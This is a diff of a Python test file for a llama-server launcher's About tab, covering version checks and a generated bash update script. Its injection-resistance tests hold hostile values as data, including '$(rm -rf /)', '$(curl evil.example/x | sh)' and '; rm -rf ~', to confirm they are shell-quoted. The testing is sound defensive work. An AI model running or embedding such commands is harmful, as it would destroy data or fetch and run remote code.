@@ -17,14 +17,48 @@ from pathlib import Path
 from unittest.mock import MagicMock, patch
 
 import pytest
-import requests
 
-from modules.about_tab import AboutTab, build_update_script
+# Don't import ``requests`` at module scope: ``modules.about_tab`` runs fine
+# without it (``REQUESTS_AVAILABLE = False``), and the regression coverage
+# for that missing-dependency path needs pytest to be able to *collect* this
+# module even when ``requests`` is not installed. Tests that genuinely need
+# ``requests.ConnectionError`` / ``requests.Timeout`` import it locally
+# (and are skipped if it's unavailable) via the ``requests_module`` fixture.
+try:
+    import requests as _requests  # noqa: F401 — probed at import time
+
+    _HAS_REQUESTS = True
+except Exception:  # pragma: no cover - exercised in stripped-down envs
+    # Catch ``Exception``, not just ``ImportError``: ``requests`` itself
+    # can raise things like ``OSError`` (corrupt cert bundle), AttributeError
+    # (broken transitive dep), or a SSLError at import time. Without the
+    # broader catch, pytest can't even *collect* this module in those
+    # environments, which is exactly the case the probe is supposed to
+    # guard against.
+    _HAS_REQUESTS = False
+
+from modules.about_tab import (
+    VERSION_CHECK_POLL_MS,
+    AboutTab,
+    _VERSION_CHECK_COMPLETE,
+    build_update_script,
+)
+
+
+@pytest.fixture
+def requests_module():
+    """Yield the ``requests`` module or skip when unavailable."""
+    if not _HAS_REQUESTS:
+        pytest.skip("requests is not installed in this environment")
+    import requests as _r
+
+    return _r
 
 
 # ---------------------------------------------------------------------------
 # factory — AboutTab.__init__ is network-free; it only reads config/version.
 # ---------------------------------------------------------------------------
+
 
 @pytest.fixture
 def about():
@@ -34,6 +68,7 @@ def about():
 # ---------------------------------------------------------------------------
 # _parse_version
 # ---------------------------------------------------------------------------
+
 
 class TestParseVersion:
     """YYYY-MM-DD-REV → 4-tuple, with a zero tuple for malformed input."""
@@ -66,6 +101,7 @@ class TestParseVersion:
 # ---------------------------------------------------------------------------
 # _is_version_newer
 # ---------------------------------------------------------------------------
+
 
 class TestIsVersionNewer:
     def test_newer_year(self, about):
@@ -106,20 +142,34 @@ class TestBuildUpdateScriptBasic:
 
     def test_script_starts_with_shebang(self):
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "2024-01-01-1", "2024-02-01-1",
-            "https://github.com/thad0ctor/llama-server-launcher", [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "2024-01-01-1",
+            "2024-02-01-1",
+            "https://github.com/thad0ctor/llama-server-launcher",
+            [],
         )
         assert s.startswith("#!/bin/bash\n")
 
     def test_script_uses_set_e(self):
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git", [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "v1",
+            "v2",
+            "https://example/repo.git",
+            [],
         )
         assert "set -e" in s
 
     def test_paths_are_quoted(self):
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git", [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "v1",
+            "v2",
+            "https://example/repo.git",
+            [],
         )
         # shlex.quote of a plain ASCII path with no special chars returns the
         # path unchanged (it's already safe), so we assert that the literal
@@ -129,16 +179,24 @@ class TestBuildUpdateScriptBasic:
 
     def test_versions_embedded(self):
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "2024-01-01-1", "2024-02-01-1",
-            "https://example/repo.git", [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "2024-01-01-1",
+            "2024-02-01-1",
+            "https://example/repo.git",
+            [],
         )
         assert "2024-01-01-1" in s
         assert "2024-02-01-1" in s
 
     def test_github_url_embedded(self):
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2",
-            "https://github.com/thad0ctor/llama-server-launcher", [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "v1",
+            "v2",
+            "https://github.com/thad0ctor/llama-server-launcher",
+            [],
         )
         assert "github.com/thad0ctor/llama-server-launcher" in s
 
@@ -149,7 +207,11 @@ class TestBuildUpdateScriptBasic:
         the important part is they're positioned inside ``(...)`` with
         ``-o -name <quoted> -prune`` repeated per pattern."""
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git",
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "v1",
+            "v2",
+            "https://example/repo.git",
             ["*.pyc", ".venv"],
         )
         assert "EXCLUDE_ARGS=(" in s
@@ -167,7 +229,11 @@ class TestBuildUpdateScriptBasic:
         over characters of the string and producing a garbled script."""
         with pytest.raises(TypeError):
             build_update_script(
-                SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git",
+                SAFE_PATH,
+                SAFE_BACKUP,
+                "v1",
+                "v2",
+                "https://example/repo.git",
                 " -o -name '*.pyc' -prune",
             )
 
@@ -178,7 +244,11 @@ class TestBuildUpdateScriptBasic:
         shell text. With shlex.quote + array expansion, the pattern survives
         as a single array element with the apostrophe intact."""
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git",
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "v1",
+            "v2",
+            "https://example/repo.git",
             ["don't_touch/*.tmp"],
         )
         # shlex.quote's POSIX-safe form joins several quoted chunks; bash
@@ -187,10 +257,16 @@ class TestBuildUpdateScriptBasic:
         assert expected in s
         # And shlex.split of the array-literal body should yield the raw
         # pattern as a single token — proving nothing leaked out.
+        # ``next(...)`` without a default raises ``StopIteration`` if
+        # ``build_update_script`` ever stops emitting this line — exactly
+        # the regression this test is meant to catch. The ``None``
+        # default + explicit assert turns that into a readable failure.
         array_line = next(
-            line for line in s.splitlines() if line.startswith("EXCLUDE_ARGS=(")
+            (line for line in s.splitlines() if line.startswith("EXCLUDE_ARGS=(")),
+            None,
         )
-        inner = array_line[len("EXCLUDE_ARGS=("):-1]
+        assert array_line is not None, "EXCLUDE_ARGS=(...) missing from build_update_script output"
+        inner = array_line[len("EXCLUDE_ARGS=(") : -1]
         tokens = shlex.split(inner)
         assert "don't_touch/*.tmp" in tokens
 
@@ -198,10 +274,24 @@ class TestBuildUpdateScriptBasic:
         """If remote version hasn't been fetched yet, build should still work
         rather than inserting the literal string 'None' into the script."""
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", None, "https://example/repo.git", [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "v1",
+            None,
+            "https://example/repo.git",
+            [],
         )
         # Empty string quoted is ''
         assert "''" in s or '""' in s
+        # And the literal Python-None repr must NOT have leaked
+        # through — a regression that does ``f"...{remote_version}"``
+        # without coercing ``None`` first would have rendered as
+        # ``"None"`` in the generated bash. Catch ``'None'`` /
+        # ``"None"`` AND a bare ``None`` token (the latter wasn't
+        # checked before — a regression that emitted unquoted
+        # ``None`` would have slipped past the two-quoted-form
+        # assertions).
+        assert "None" not in s
 
 
 class TestBuildUpdateScriptInjectionResistance:
@@ -231,8 +321,12 @@ class TestBuildUpdateScriptInjectionResistance:
         literal."""
         evil = "/home/user/$(rm -rf /)/launcher"
         s = build_update_script(
-            Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", [],
+            Path(evil),
+            Path("/tmp/backup"),
+            "v1",
+            "v2",
+            "https://example/repo.git",
+            [],
         )
         # Derive the expected quoted form from the same Path round-trip the
         # SUT uses, so the assertion holds on Windows (which normalizes
@@ -243,16 +337,24 @@ class TestBuildUpdateScriptInjectionResistance:
         """Backtick is classic command substitution — same treatment."""
         evil = "/home/`touch pwned`/launcher"
         s = build_update_script(
-            Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", [],
+            Path(evil),
+            Path("/tmp/backup"),
+            "v1",
+            "v2",
+            "https://example/repo.git",
+            [],
         )
         assert shlex.quote(str(Path(evil))) in s
 
     def test_semicolon_in_path(self):
         evil = "/home/user/a;echo pwned;/launcher"
         s = build_update_script(
-            Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", [],
+            Path(evil),
+            Path("/tmp/backup"),
+            "v1",
+            "v2",
+            "https://example/repo.git",
+            [],
         )
         # Should be wrapped — not a bare command separator.
         assert shlex.quote(str(Path(evil))) in s
@@ -260,8 +362,12 @@ class TestBuildUpdateScriptInjectionResistance:
     def test_ampersand_in_path(self):
         evil = "/home/user/a&&touch pwned&&x/launcher"
         s = build_update_script(
-            Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", [],
+            Path(evil),
+            Path("/tmp/backup"),
+            "v1",
+            "v2",
+            "https://example/repo.git",
+            [],
         )
         assert shlex.quote(str(Path(evil))) in s
 
@@ -271,8 +377,12 @@ class TestBuildUpdateScriptInjectionResistance:
         crashes and the encoded form round-trips through shlex.split."""
         evil = "/home/user's dir/launcher"
         s = build_update_script(
-            Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", [],
+            Path(evil),
+            Path("/tmp/backup"),
+            "v1",
+            "v2",
+            "https://example/repo.git",
+            [],
         )
         # Round-trip: find the quoted token and confirm shlex decodes it back
         # to the original path.
@@ -285,15 +395,24 @@ class TestBuildUpdateScriptInjectionResistance:
         is compromised it could feed us ``$(...)``. Must also be quoted."""
         evil_remote = "$(curl evil.example/x | sh)"
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "2024-01-01-1", evil_remote,
-            "https://example/repo.git", [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "2024-01-01-1",
+            evil_remote,
+            "https://example/repo.git",
+            [],
         )
         assert shlex.quote(evil_remote) in s
 
     def test_github_url_quoted(self):
         evil_url = "https://example/repo.git; rm -rf ~"
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2", evil_url, [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "v1",
+            "v2",
+            evil_url,
+            [],
         )
         assert shlex.quote(evil_url) in s
 
@@ -302,22 +421,35 @@ class TestBuildUpdateScriptInjectionResistance:
 # _check_version_online — network paths
 # ---------------------------------------------------------------------------
 
+
 class TestCheckVersionOnline:
     """Branch coverage for the background network probe."""
 
-    def test_network_failure_sets_check_failed(self, about):
+    def test_requests_missing_sets_status_without_crashing(self, about, monkeypatch):
+        about._update_version_display = MagicMock()
+        monkeypatch.setattr("modules.about_tab.REQUESTS_AVAILABLE", False)
+        monkeypatch.setattr("modules.about_tab.requests", None)
+
+        about._check_version_online()
+
+        assert about.version_status == "requests not installed"
+        about._update_version_display.assert_called_once()
+
+    def test_network_failure_sets_check_failed(self, about, requests_module):
         """``RequestException`` should flip status to ``Check Failed`` and
         call ``_update_version_display`` so the user knows it didn't work."""
         about._update_version_display = MagicMock()
 
-        with patch("modules.about_tab.requests.get",
-                   side_effect=requests.ConnectionError("unreachable")):
+        with patch(
+            "modules.about_tab.requests.get",
+            side_effect=requests_module.ConnectionError("unreachable"),
+        ):
             about._check_version_online()
 
         assert about.version_status == "Check Failed"
         about._update_version_display.assert_called_once()
 
-    def test_http_non_200_sets_check_failed(self, about):
+    def test_http_non_200_sets_check_failed(self, about, requests_module):
         """A 404 or 500 also surfaces as ``Check Failed`` — not silent success."""
         about._update_version_display = MagicMock()
         fake_resp = MagicMock()
@@ -328,8 +460,12 @@ class TestCheckVersionOnline:
             about._check_version_online()
 
         assert about.version_status == "Check Failed"
+        # The display refresh MUST happen on the failure path too —
+        # otherwise the label stays stuck on the prior status (often
+        # ``"Checking..."``) until the next successful check.
+        about._update_version_display.assert_called_once()
 
-    def test_up_to_date_sets_current(self, about):
+    def test_up_to_date_sets_current(self, about, requests_module):
         """Remote matches local → status ``Current`` and no update button."""
         about._update_version_display = MagicMock()
         about._show_update_button = MagicMock()
@@ -346,7 +482,7 @@ class TestCheckVersionOnline:
         assert about.remote_version == "2024-01-01-1"
         about._show_update_button.assert_not_called()
 
-    def test_newer_remote_sets_update_available(self, about):
+    def test_newer_remote_sets_update_available(self, about, requests_module):
         about._update_version_display = MagicMock()
         about._show_update_button = MagicMock()
         about.version = "2024-01-01-1"
@@ -362,20 +498,106 @@ class TestCheckVersionOnline:
         assert about.remote_version == "2024-02-01-1"
         about._show_update_button.assert_called_once()
 
-    def test_timeout_treated_as_check_failed(self, about):
+    def test_timeout_treated_as_check_failed(self, about, requests_module):
         """Timeouts are a subclass of RequestException — same graceful path."""
         about._update_version_display = MagicMock()
 
-        with patch("modules.about_tab.requests.get",
-                   side_effect=requests.Timeout("slow")):
+        with patch(
+            "modules.about_tab.requests.get",
+            side_effect=requests_module.Timeout("slow"),
+        ):
             about._check_version_online()
 
         assert about.version_status == "Check Failed"
+        # Timeouts share the same failure path as ConnectionError /
+        # HTTP 500 — the display must refresh, not stay on
+        # ``"Checking..."``.
+        about._update_version_display.assert_called_once()
+
+    def test_malformed_200_body_treated_as_check_failed(self, about, requests_module):
+        """A ``200 OK`` with a blank or unparseable body is NOT a valid
+        version string — ``_check_version_online`` must surface
+        ``"Check Failed"`` so the label doesn't display the literal
+        garbage text or stay stuck on ``"Checking..."``. Locks in
+        the dedicated post-200 sanity branch.
+        """
+        about._update_version_display = MagicMock()
+        fake_resp = MagicMock()
+        fake_resp.status_code = 200
+        fake_resp.text = ""  # truly blank — common 200-with-no-CDN-body
+
+        with patch("modules.about_tab.requests.get", return_value=fake_resp):
+            about._check_version_online()
+
+        assert about.version_status == "Check Failed"
+        assert about._update_version_display.called
+
+    def test_garbage_200_body_treated_as_check_failed(self, about, requests_module):
+        """Same regression as above but with a non-empty but
+        unparseable body — ``"hello"`` isn't a SemVer / build number.
+        """
+        about._update_version_display = MagicMock()
+        fake_resp = MagicMock()
+        fake_resp.status_code = 200
+        fake_resp.text = "hello"
+
+        with patch("modules.about_tab.requests.get", return_value=fake_resp):
+            about._check_version_online()
+
+        assert about.version_status == "Check Failed"
+        assert about._update_version_display.called
+
+
+# ---------------------------------------------------------------------------
+# _drain_version_queue — worker completion race
+# ---------------------------------------------------------------------------
+
+
+class FakeAfterParent:
+    def __init__(self):
+        self.after_calls = []
+
+    def after(self, delay_ms, callback):
+        self.after_calls.append((delay_ms, callback))
+        return f"after-{len(self.after_calls)}"
+
+
+class TestDrainVersionQueue:
+    def test_empty_queue_keeps_polling_until_completion_observed(self, about):
+        """Regression: an empty queue alone is not proof the worker is done."""
+        parent = FakeAfterParent()
+        about._parent = parent
+        about._version_check_pending = True
+        about._version_after_id = "existing-after"
+        about._version_thread = MagicMock()
+        about._version_thread.is_alive.return_value = False
+        about._widget_alive = MagicMock(return_value=True)
+
+        about._drain_version_queue()
+
+        assert about._version_after_id == "after-1"
+        assert parent.after_calls == [(VERSION_CHECK_POLL_MS, about._drain_version_queue)]
+        about._version_thread.is_alive.assert_not_called()
+
+    def test_completion_sentinel_stops_polling_without_ui_change(self, about):
+        parent = FakeAfterParent()
+        about._parent = parent
+        about._version_check_pending = True
+        about._version_queue.put(_VERSION_CHECK_COMPLETE)
+        about._update_version_display = MagicMock()
+
+        about._drain_version_queue()
+
+        assert about._version_check_pending is False
+        assert parent.after_calls == []
+        assert about.version_status == "Checking..."
+        about._update_version_display.assert_not_called()
 
 
 # ---------------------------------------------------------------------------
 # _generate_update_script — exercised via the public method on an AboutTab
 # ---------------------------------------------------------------------------
+
 
 class TestGenerateUpdateScriptIntegration:
     """Make sure the refactor didn't break the method wiring."""
